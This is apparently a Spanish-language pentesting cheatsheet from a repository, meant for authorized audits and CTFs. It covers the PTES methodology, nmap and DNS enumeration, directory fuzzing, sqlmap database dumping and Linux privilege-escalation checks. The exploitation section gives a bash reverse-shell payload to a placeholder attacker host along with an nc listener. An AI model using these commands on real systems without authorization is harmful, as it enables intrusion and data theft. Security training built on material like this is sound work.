# Ethical Hacking & Pentesting Professional Cheatsheet

Este repositorio contiene una guía de referencia rápida, metodologías de auditoría y comandos esenciales para pruebas de penetración autorizadas, análisis de vulnerabilidades y resolución de retos CTF (Capture The Flag).

---

## Metodología de Auditoría (PTES)

1. **Reconocimiento (Information Gathering):** Recopilación de inteligencia pública y mapeo de la superficie expuesta.
2. **Escaneo y Enumeración:** Identificación de hosts activos, puertos abiertos, servicios y versiones de software.
3. **Análisis de Vulnerabilidades:** Detección de fallas conocidas (CVEs), configuraciones defectuosas y parches pendientes.
4. **Explotación:** Validación del impacto mediante la ejecución de exploits o pruebas de concepto (PoC).
5. **Post-Explotación:** Medición del alcance dentro de la red (movimiento lateral, persistencia, extracción de datos).
6. **Reporte y Remediación:** Documentación técnica de hallazgos y recomendaciones de mitigación.

---

## Reconocimiento y Enumeración de Redes

### Escaneo de Hosts y Puertos con Nmap
- **Escaneo sigiloso de todos los puertos:**
  `sudo nmap -sS -p- --min-rate 5000 <IP_OBJETIVO>`
- **Detección exhaustiva (Servicios, OS y Scripts por defecto):**
  `nmap -A -p- <IP_OBJETIVO>`
- **Escaneo de puertos UDP principales:**
  `sudo nmap -sU --top-ports 20 <IP_OBJETIVO>`

### Enumeración DNS
- **Consulta de registros de dominio:** `dig <DOMINIO> ANY`
- **Intento de transferencia de zona:** `dig axfr @<IP_DNS> <DOMINIO>`
- **Fuzzing de subdominios:**
  `gobuster dns -d <DOMINIO> -w /usr/share/wordlists/discovery/dns_hosts.txt`

---

## Pentesting Web y Top 10 OWASP

### Fuzzing de Directorios y Archivos Ocultos
- **Gobuster:**
  `gobuster dir -u http://<IP_OBJETIVO> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt`
- **FFUF (Fuzzing avanzado):**
  `ffuf -u http://<IP_OBJETIVO>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

### Auditoría de Inyecciones SQL (SQLi)
- **Detección y extracción automatizada con SQLMap:**
  `sqlmap -u "http://<IP_OBJETIVO>/item.php?id=1" --batch --dbs`
- **Volcado de tablas específicas:**
  `sqlmap -u "http://<IP_OBJETIVO>/item.php?id=1" -D <NOMBRE_DB> --tables --dump`

### Análisis de Tráfico y Control de Acceso
- Manipulación de peticiones HTTP/HTTPS mediante **Burp Suite** o **OWASP ZAP**.
- Análisis de manipulación de parámetros, tokens JWT y vulnerabilidades de control de acceso roto (IDOR).

---

## Explotación y Post-Explotación

### Generación de Shells Inversas (Reverse Shells)
- **Oyente en la máquina del auditor:** `nc -lvnp 4444`
- **Payload Bash en la máquina objetivo:**
  `bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1`

### Reconocimiento de Privilegios en Linux
- **Búsqueda de binarios con permisos SUID elevados:**
  `find / -perm -4000 -type f 2>/dev/null`
- **Verificación de permisos de ejecución Sudo:**
  `sudo -l`

---

## Descargo de Responsabilidad (Disclaimer)

> **Importante:** El contenido y las herramientas documentadas en este repositorio se proporcionan únicamente con fines educativos y de capacitación en auditorías de seguridad autorizadas. El uso de estas técnicas contra sistemas sin consentimiento expreso es ilegal.
